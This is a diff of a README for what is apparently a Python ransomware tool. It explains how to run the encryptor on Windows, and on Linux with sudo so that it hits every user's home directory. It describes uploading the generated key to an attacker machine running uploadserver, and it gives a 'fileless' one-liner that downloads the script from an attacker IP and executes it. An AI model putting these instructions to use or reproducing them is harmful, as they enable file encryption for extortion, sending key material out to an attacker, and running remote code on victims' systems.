@@ -9,23 +9,33 @@ upload your key to your attack machine. It highly recommended that you are able 
 # Remember
 IMPORTANT: Read the comments at the top of the python script before use. Update the Url for the uploading of the key and include port too. Just an idea... the key is generated at execution, but could be downloaded and passed as a string to eliminate the liability of the uploadserver. The code would have to be refactored at that point and a key would have to be generated prior. Windows will only affect the current user's home directory. Linux is ran with sudo and affects all users in /home. Use reveal.py for decryption.
 # Windows
+```Powershell
 python3 .\3raw05nar.py
+```
 # Linux
+```bash
 sudo python3 3raw05nar.py
+```
 # Python Upload Server
+```bash
 pip3 install uploadserver
-Your machine - Example: python3 -m uploadserver 44444
+```
+Your machine - Example: 
+```bash
+python3 -m uploadserver 44444
+```
 # Fileless Approach
+```bash
 python3 -c ("""from urllib.request import urlopen;url = 'http://< YOUR IP >/< DIRECTORY >/3rawm05nar.py';outtie = urlopen(url).read();getit = outtie.decode('utf-8');exec(outtie)""")
+```
 # Additional Resources
-NetworkChuck
 
-https://www.youtube.com/watch?v=UtMMjXOlRQc&t=609s
+[NetworkChuck](https://www.youtube.com/watch?v=UtMMjXOlRQc&t=609s)
 
 HTTP/HTTPS python upload server
 
-https://pypi.org/project/uploadserver/
+[https://pypi.org/project/uploadserver/](https://pypi.org/project/uploadserver/)
 
 Python simplehttpserver
 
-https://stackoverflow.com/questions/39788591/python-simplehttpserver-to-receive-files
+[https://stackoverflow.com/questions/39788591/python-simplehttpserver-to-receive-files](https://stackoverflow.com/questions/39788591/python-simplehttpserver-to-receive-files)
